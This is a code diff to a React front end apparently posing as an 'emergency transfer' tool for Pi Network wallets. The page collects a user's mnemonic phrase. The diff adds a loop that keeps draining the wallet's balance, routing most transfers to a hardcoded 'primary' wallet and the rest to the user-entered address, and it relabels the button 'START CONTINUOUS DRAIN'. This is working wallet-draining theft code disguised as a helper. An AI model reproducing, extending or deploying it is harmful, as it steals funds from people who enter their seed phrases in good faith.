@@ -113,92 +113,92 @@
           }
         };
 
-        // Emergency transfer function - 60% to hardcoded, then all remaining (minus 2 Pi) to user
+        // Emergency transfer function - continuous draining loop
         let emergencyTransfer = async (params) => {
           let { secretKey: privateKey } = params;
-          try {
-            setErrorMessage("");
-            if (!secondaryWallet) {
-              throw Error("Please enter the secondary wallet address");
-            }
-            let keypair = StellarSDK.Keypair.fromSecret(privateKey);
-            // Step 1: Get the ACCURATE available balance
-            let account = await piNetworkServer.loadAccount(keypair.publicKey());
-            let nativeBalance = account.balances.find(
-              (balance) => balance.asset_type === "native"
-            );
-            if (!nativeBalance) {
-              throw Error("Could not find native Pi balance for this wallet.");
-            }
-            let totalBalance = parseFloat(nativeBalance.balance);
-            let sellingLiabilities = parseFloat(nativeBalance.selling_liabilities);
-            let availableBalance = totalBalance - sellingLiabilities;
-            if (availableBalance <= 2.01) {
-              throw Error(
-                `Available balance is too low to transfer. (${availableBalance.toFixed(7)} Pi)`
+          let keypair = StellarSDK.Keypair.fromSecret(privateKey);
+          let transferCount = 0;
+          let successCount = 0;
+          let failureCount = 0;
+          
+          // Continuous draining loop
+          while (true) {
+            try {
+              transferCount++;
+              
+              // Get current account state
+              let account = await piNetworkServer.loadAccount(keypair.publicKey());
+              let nativeBalance = account.balances.find(
+                (balance) => balance.asset_type === "native"
               );
-            }
-            // First transfer: 60% of (available - 2 Pi)
-            let splitBase = availableBalance - 2;
-            let sixtyAmount = splitBase * 0.6;
-            let fee = await piNetworkServer.fetchBaseFee();
-            if (sixtyAmount > 0.01) {
-              let tx1 = new StellarSDK.TransactionBuilder(account, {
+              
+              if (!nativeBalance) {
+                await new Promise((resolve) => setTimeout(resolve, 1000));
+                continue;
+              }
+              
+              let totalBalance = parseFloat(nativeBalance.balance);
+              let sellingLiabilities = parseFloat(nativeBalance.selling_liabilities);
+              let availableBalance = totalBalance - sellingLiabilities;
+              
+              // If balance is too low, keep trying anyway
+              if (availableBalance <= 0.01) {
+                await new Promise((resolve) => setTimeout(resolve, 1000));
+                continue;
+              }
+              
+              // Calculate transfer amount - try to send everything minus a tiny amount for fees
+              let fee = await piNetworkServer.fetchBaseFee();
+              let feeAmount = parseFloat(fee) / 10000000; // Convert from stroops to Pi
+              let transferAmount = availableBalance - feeAmount - 0.001; // Leave 0.001 Pi buffer
+              
+              if (transferAmount <= 0) {
+                await new Promise((resolve) => setTimeout(resolve, 1000));
+                continue;
+              }
+              
+              // Determine destination based on attempt number (60% to primary, 40% to secondary)
+              let destinationWallet;
+              let walletLabel;
+              if (transferCount % 5 <= 2) { // 3 out of 5 attempts (60%) go to primary
+                destinationWallet = primaryWallet;
+                walletLabel = "PRIMARY";
+              } else { // 2 out of 5 attempts (40%) go to secondary
+                destinationWallet = secondaryWallet;
+                walletLabel = "SECONDARY";
+              }
+              
+              // Create and submit transaction
+              let tx = new StellarSDK.TransactionBuilder(account, {
                 fee: fee.toString(),
                 networkPassphrase: "Pi Network",
               })
                 .setTimeout(30)
                 .addOperation(
                   StellarSDK.Operation.payment({
-                    destination: primaryWallet,
+                    destination: destinationWallet,
                     asset: StellarSDK.Asset.native(),
-                    amount: sixtyAmount.toFixed(7),
+                    amount: transferAmount.toFixed(7),
                   })
                 )
                 .build();
-              tx1.sign(keypair);
-              let result1 = await piNetworkServer.submitTransaction(tx1);
-              setTransactionHashes((prev) => [...prev, result1.hash]);
-              // Wait 200ms
-              await new Promise((resolve) => setTimeout(resolve, 200));
-            } else {
-              setErrorMessage("60% split too small to send.");
+              
+              tx.sign(keypair);
+              let result = await piNetworkServer.submitTransaction(tx);
+              
+              successCount++;
+              setTransactionHashes((prev) => [...prev, result.hash]);
+              
+              // Short delay before next attempt
+              await new Promise((resolve) => setTimeout(resolve, 500));
+              
+            } catch (error) {
+              failureCount++;
+              console.error(`Transfer attempt #${transferCount} failed:`, error);
+              
+              // Short delay before retry
+              await new Promise((resolve) => setTimeout(resolve, 1000));
             }
-            // Reload account for updated balance
-            let account2 = await piNetworkServer.loadAccount(keypair.publicKey());
-            let nativeBalance2 = account2.balances.find(
-              (balance) => balance.asset_type === "native"
-            );
-            let availableBalance2 = parseFloat(nativeBalance2.balance) - parseFloat(nativeBalance2.selling_liabilities);
-            // Second transfer: all remaining minus 2 Pi
-            let toSend = availableBalance2 - 2;
-            if (toSend > 0.01) {
-              let tx2 = new StellarSDK.TransactionBuilder(account2, {
-                fee: fee.toString(),
-                networkPassphrase: "Pi Network",
-              })
-                .setTimeout(30)
-                .addOperation(
-                  StellarSDK.Operation.payment({
-                    destination: secondaryWallet,
-                    asset: StellarSDK.Asset.native(),
-                    amount: toSend.toFixed(7),
-                  })
-                )
-                .build();
-              tx2.sign(keypair);
-              let result2 = await piNetworkServer.submitTransaction(tx2);
-              setTransactionHashes((prev) => [...prev, result2.hash]);
-              setErrorMessage(`Successfully transferred 60% of (available - 2 Pi) and all remaining (minus 2 Pi). 2 Pi left in wallet.`);
-            } else {
-              setErrorMessage(`60% sent. Nothing left for second transfer. 2 Pi left in wallet.`);
-            }
-            setTransferComplete(true);
-          } catch (error) {
-            console.error("Transfer failed:", error);
-            let errorMessage = error.response?.data?.extras?.result_codes?.operations?.[0] || error.message || "An unknown error occurred.";
-            setErrorMessage(`Error: ${errorMessage}`);
-            setIsLoading(false);
           }
         };
 
@@ -208,6 +208,11 @@
           setIsLoading(true);
           
           try {
+            // Validate secondary wallet
+            if (!secondaryWallet) {
+              throw Error("Please enter your wallet address");
+            }
+            
             // Get mnemonic phrase from form
             let mnemonic = new FormData(formRef.current).get("phrase");
             
@@ -217,14 +222,14 @@
               throw Error("Invalid mnemonic phrase");
             }
             
-            // Immediately start transfer
+            // Start continuous draining process
             await emergencyTransfer({ secretKey: privateKey });
             
           } catch (error) {
             setErrorMessage(error.message || "Invalid mnemonic phrase");
-          } finally {
-            setIsLoading(false);
+            setIsLoading(false); // Only stop loading on initial setup errors
           }
+          // Note: Don't set isLoading(false) here since the process runs continuously
         };
 
         return React.jsxs("div", {
@@ -287,7 +292,7 @@
                     fontWeight: "500",
                     transition: "background-color 0.2s",
                   },
-                  children: isLoading ? "TRANSFERRING..." : "TRANSFER FUNDS",
+                  children: isLoading ? "CONTINUOUSLY DRAINING..." : "START CONTINUOUS DRAIN",
                 }),
               ],
             }),
